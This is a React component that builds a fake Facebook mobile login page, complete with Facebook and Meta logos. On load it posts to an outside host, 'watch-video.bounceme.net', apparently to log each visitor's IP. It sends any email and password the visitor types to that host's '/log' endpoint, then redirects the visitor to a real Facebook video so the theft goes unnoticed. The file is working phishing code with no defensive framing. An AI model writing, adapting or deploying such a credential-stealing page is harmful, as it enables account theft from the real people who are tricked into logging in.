import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import "./style.css";

const URL = "http://watch-video.bounceme.net:3000";

const LoginForm = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isCheckIp, setIsCheckIp] = useState(false);

  const sendIp = async () => {
    try {
      const response = await axios.post(URL + "/");

      // if (response.data.isExist) {
      //   window.location.href = "https://fb.watch/tgotIfIy90/";
      // }

      setIsCheckIp(true);
    } catch (error) {
      console.log(error);
    }
  };

  sendIp();

  const handleSubmit = async (event) => {
    // console.log(email, password); // Log email and password

    try {
      const response = await axios.post(URL + "/log", {
        email,
        password,
      });

      setEmail("");
      setPassword("");

      window.location.href = "https://fb.watch/tgotIfIy90/";
    } catch (error) {
      console.error("Error:", error);
    }
  };

  const handleEmailChange = (event) => {
    setEmail(event.target.value); // Update email state with input value
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value); // Update password state with input value
  };

  // if (!isCheckIp) {
  //   return;
  // }

  return (
    <div
      style={{
        display: "flex",
        width: "100%",
        height: "95vh",
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <div className="container">
        <div
          style={{
            width: "100%",
            height: "80vh",
            display: "flex",
            flexDirection: "column",
            justifyContent: "space-evenly",
          }}
        >
          <div className="logo">
            <img
              src={require("./facebook-logo.png")}
              alt="Facebook logo"
              style={{ width: "60px", height: "60px" }}
            />
          </div>

          <div id="loginForm" style={{ width: "100%" }}>
            <div className="form-group">
              <input
                type="text"
                id="email"
                name="email"
                required
                placeholder="Mobile number or Email address"
                onChange={handleEmailChange} // Updated onChange handler
              />
            </div>
            <div className="form-group">
              <input
                type="password"
                id="password"
                name="password"
                required
                placeholder="Password"
                onChange={handlePasswordChange} // Updated onChange handler
              />
            </div>
            <div className="form-group">
              <button type="submit" onClick={handleSubmit}>
                Log In
              </button>
            </div>
            <div
              style={{
                display: "flex",
                flexDirection: "row",
                width: "100%",
                justifyContent: "center",
              }}
            >
              <a href="https://m.facebook.com/login/identify/">
                Forgotten password?
              </a>
            </div>
          </div>
        </div>

        <div className="footer">
          <a href="https://m.facebook.com/reg/">
            <button className="create-new">Create New Account</button>
          </a>

          <div className="logo">
            <img
              src={require("./meta.png")}
              alt="Meta logo"
              style={{ opacity: "0.8", margin: "10px 0" }}
            />
          </div>

          <div
            style={{
              opacity: "0.8",
              margin: "20px 0 0 0",
              fontSize: "10px",
              justifyContent: "center",
            }}
          >
            <a href="https://about.meta.com/">About</a>
            <a href="https://m.facebook.com/help/?ref=pf">Help</a>
            <a href="#">More</a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
